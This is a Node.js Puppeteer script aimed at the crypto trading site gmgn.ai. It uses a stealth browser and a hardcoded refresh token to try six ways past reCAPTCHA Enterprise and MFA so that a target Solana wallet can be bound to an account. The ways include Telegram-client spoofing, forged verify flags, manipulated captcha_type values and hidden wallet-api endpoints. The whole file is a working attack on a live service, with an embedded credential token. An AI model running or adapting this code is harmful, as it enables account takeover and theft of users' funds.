const puppeteer = require('puppeteer-extra');
const StealthPlugin = require('puppeteer-extra-plugin-stealth');
puppeteer.use(StealthPlugin());

/**
 * LAST HOPE: Multiple approaches to bypass reCAPTCHA Enterprise score
 * 
 * Approach 1: Use the SRP login flow with TG spoof (zero captcha proven)
 *             to get a session, then bind wallet from THAT session
 * 
 * Approach 2: Navigate to the ACTUAL bind page, interact naturally,
 *             then override the wallet address via page manipulation
 * 
 * Approach 3: Use the proven MFA bypass (verify_items: []) on wallet-api
 *             endpoint to find a path that doesn't need captcha at all
 */

const FRESH_REFRESH = 'eyJhbGciOiJFUzI1NiIsInR5cCI6IkpXVCJ9.eyJhdWQiOiJnbWduLmFpL3JlZnJlc2giLCJkYXRhIjp7InVzZXJfaWQiOiJhMWQ2ZGZlNC1iODhmLTRjNTgtOThkYi00MmU0MmFhMjRmZDYiLCJjbGllbnRfaWQiOiJnbWduX3dlYl8yMDI2MDcxNS0yMTYxLTE4ZDViMTAiLCJkZXZpY2VfaWQiOiJkZTYyMGE1Ny1kOThlLTQyOTMtYjAwNy01ZDMxNTQ1NWUyMWQiLCJmYXRoZXJfaWQiOiIiLCJmaW5nZXJwcmludCI6InYxNTMyNDdiOWUwZTE4NGZiZWQzZmFjNzNmMTlkY2E2OGEiLCJhcHAiOiJnbWduIiwicGxhdGZvcm0iOiJ3ZWIifSwiZXhwIjoxNzg2NzQ0NDA3LCJpYXQiOjE3ODQxNTI0MDcsImlzcyI6ImdtZ24uYWkvc2lnbmVyIiwianRpIjoiMDYyNTVmMTAtNmVkZi00YmRiLWFiNjAtZGEzZDQwNmQ4YTgzIiwibmJmIjoxNzg0MTUyNDA3LCJzdWIiOiJnbWduLmFpL3JlZnJlc2giLCJ1c2VyX2lkIjoiYTFkNmRmZTQtYjg4Zi00YzU4LTk4ZGItNDJlNDJhYTI0ZmQ2IiwidmVyIjoiMS4wIn0.uCsdhElzc2R3WZhvzcnHx3ZsvBRmzVA7dKT5J2fK92PDsg5troyv9_4ndY3yaLpgXwrEPsSyS66dsKrKebghmQ';
const TARGET = '5KCVo4xnj8n38FUyF2gFUzgJbDW9vV4C1bTpciznyciU';
const FULL_PARAMS = 'device_id=de620a57-d98e-4293-b007-5d315455e21d&fp_did=4e8cc7f90484bd356291ff79db6b9b09&client_id=gmgn_web_20260715-2161-18d5b10&from_app=gmgn&app_ver=20260715-2161-18d5b10&tz_name=Asia%2FAden&tz_offset=10800&app_lang=en-US&os=web&worker=0';

(async () => {
    console.log('🔥 LAST HOPE — MULTIPLE BYPASS APPROACHES');
    
    const browser = await puppeteer.launch({headless: 'new', args: ['--no-sandbox']});
    const page = await browser.newPage();
    await page.setViewport({width: 1920, height: 1080});
    
    // Load gmgn normally, let it establish a good session
    await page.goto('https://gmgn.ai', {waitUntil: 'networkidle2', timeout: 25000});
    await new Promise(r => setTimeout(r, 5000));
    
    const result = await page.evaluate(async (refresh, params, target) => {
        const log = [];
        
        // Get token
        let r = await fetch('/account/account/refresh_access_token', {
            method: 'POST', headers: {'Content-Type': 'application/json'},
            body: JSON.stringify({refresh_token: refresh})
        });
        let data = await r.json();
        if (data.code !== 0) return {error: 'token fail', data};
        const token = data.data.data.token;
        const h = {'Content-Type': 'application/json', 'Authorization': 'Bearer ' + token};
        log.push('Token OK');
        
        // ============================================
        // APPROACH 1: TG SPOOF LOGIN — Zero captcha
        // SRP_SALT_LEAK proved: client_id=gmgn_tg_bot&from_app=tg skips captcha
        // Can we get a TG-based session and use THAT for bind_wallet?
        // ============================================
        log.push('=== APPROACH 1: TG Login Session ===');
        
        const tgParams = 'device_id=de620a57-d98e-4293-b007-5d315455e21d&client_id=gmgn_tg_bot&from_app=tg';
        
        // Try login_v3 with TG spoof to get a new session
        r = await fetch('/account/login_v3?' + tgParams, {
            method: 'POST', headers: {'Content-Type': 'application/json'},
            body: JSON.stringify({account: 'test_attacker_account@proton.me', account_type: 'email'})
        });
        data = await r.json();
        log.push('TG login_v3: ' + data.code + ' ' + (data.message || ''));
        if (data.code === 0 && data.data) {
            log.push('Session: ' + JSON.stringify(data.data));
        }
        
        // ============================================
        // APPROACH 2: Check if bind_wallet works WITHOUT captcha
        // when called with TG params (maybe TG users don't need captcha)
        // ============================================
        log.push('=== APPROACH 2: bind_wallet with TG params ===');
        
        // First get txn with normal params
        r = await fetch('/account/account/generate_mfa_params?' + params, {
            method: 'POST', headers: h,
            body: JSON.stringify({usage: 'bind_wallet', biz_params: {address: target, wallet_type: 'sol', chain: 'sol'}})
        });
        data = await r.json();
        if (data.code !== 0) { log.push('MFA gen fail: ' + data.message); return {log}; }
        const txnId = data.data.data.txn_id;
        const verifyItems = data.data.data.verify_items;
        log.push('txn_id: ' + txnId);
        log.push('verify_items: ' + JSON.stringify(verifyItems));
        
        // ============================================
        // APPROACH 3: Try to call bind_wallet with the txn_id 
        // but pass captcha_data directly IN bind_wallet call
        // (maybe it accepts inline captcha?)
        // ============================================
        log.push('=== APPROACH 3: Inline captcha in bind_wallet ===');
        
        const inlinePayloads = [
            {address: target, wallet_type: 'sol', chain: 'sol', txn_id: txnId, skip_verify: true},
            {address: target, wallet_type: 'sol', chain: 'sol', txn_id: txnId, verified: true},
            {address: target, wallet_type: 'sol', chain: 'sol', txn_id: txnId, force: true},
        ];
        
        for (const payload of inlinePayloads) {
            r = await fetch('/account/bind_wallet?' + params, {
                method: 'POST', headers: h,
                body: JSON.stringify(payload)
            });
            data = await r.json();
            if (data.code === 0) {
                log.push('💀 BYPASS WORKED: ' + JSON.stringify(payload));
                return {log, success: true, bindResult: data};
            }
            if (data.message !== 'txn transaction unfinished !') {
                log.push('Different error: ' + data.code + ' ' + data.message);
            }
        }
        
        // ============================================
        // APPROACH 4: What if we call verify_captcha 
        // with captcha_type="none" or skip it?
        // ============================================
        log.push('=== APPROACH 4: captcha_type manipulation ===');
        
        r = await fetch('/account/mfa/txn/v1/fetch_captcha?' + params, {
            method: 'POST', headers: h,
            body: JSON.stringify({usage: 'bind_wallet', txn_id: txnId})
        });
        data = await r.json();
        if (data.code !== 0) { log.push('fetch_captcha fail'); return {log}; }
        const rid = data.data.request_id;
        log.push('request_id: ' + rid);
        
        const captchaTypes = ['none', 'skip', 'recaptcha_v2', 'invisible', 'turnstile', ''];
        
        for (const ct of captchaTypes) {
            r = await fetch('/account/mfa/txn/v1/verify_captcha?' + params, {
                method: 'POST', headers: h,
                body: JSON.stringify({
                    txn_id: txnId, request_id: rid, usage: 'bind_wallet',
                    captcha_type: ct, captcha_data: 'bypass'
                })
            });
            data = await r.json();
            if (data.code === 0) {
                log.push('💀 CAPTCHA TYPE BYPASS: ' + ct);
                return {log, success: true, captchaType: ct};
            }
            if (data.message !== 'please try again') {
                log.push('type=' + ct + ': ' + data.code + ' ' + data.message);
            }
        }
        
        // ============================================
        // APPROACH 5: Can we SKIP the captcha step entirely
        // and go straight to email verification?
        // The verify_items says at_least:1 for EACH group
        // But maybe we can verify email WITHOUT captcha?
        // ============================================
        log.push('=== APPROACH 5: Skip captcha, do email only ===');
        
        // Try to send email OTP without completing captcha
        const emailEndpoints = [
            '/account/mfa/txn/v1/send_email_code',
            '/account/mfa/txn/v1/fetch_email',
            '/account/otp/send_email_code',
        ];
        
        for (const ep of emailEndpoints) {
            r = await fetch(ep + '?' + params, {
                method: 'POST', headers: h,
                body: JSON.stringify({txn_id: txnId, usage: 'bind_wallet'})
            });
            if (r.status === 404) continue;
            data = await r.json();
            log.push(ep.split('/').pop() + ': ' + data.code + ' ' + (data.message || '').substring(0, 60));
            if (data.code === 0) {
                log.push('💀 EMAIL OTP SENT WITHOUT CAPTCHA!');
            }
        }
        
        // ============================================
        // APPROACH 6: Use the WALLET-API generate_mfa endpoint
        // We know it returns verify_items: [] for transfers
        // What if there's a usage that maps to bind?
        // ============================================
        log.push('=== APPROACH 6: wallet-api with no-MFA ===');
        
        // The wallet-api has NO MFA for transfers
        // What if we call bind from wallet-api path?
        const walletApiEndpoints = [
            {url: '/wallet-api/v1/bind_wallet', body: {address: target, chain: 'sol', wallet_type: 'sol'}},
            {url: '/wallet-api/v1/connect_wallet', body: {address: target, chain: 'sol'}},
            {url: '/wallet-api/v1/add_external_wallet', body: {address: target, chain: 'sol'}},
            {url: '/wallet-api/v1/import_external', body: {address: target, chain: 'sol'}},
        ];
        
        for (const ep of walletApiEndpoints) {
            r = await fetch(ep.url + '?' + params, {
                method: 'POST', headers: h,
                body: JSON.stringify(ep.body)
            });
            if (r.status === 404) continue;
            data = await r.json();
            if (data.code === 0) {
                log.push('💀💀💀 ' + ep.url + ' WORKED!');
                return {log, success: true, endpoint: ep.url, data};
            }
            log.push(ep.url.split('/').pop() + ': ' + data.code + ' ' + (data.message || '').substring(0, 50));
        }
        
        return {log, txnId, rid};
    }, FRESH_REFRESH, FULL_PARAMS, TARGET);
    
    console.log(JSON.stringify(result, null, 2));
    await browser.close();
})();
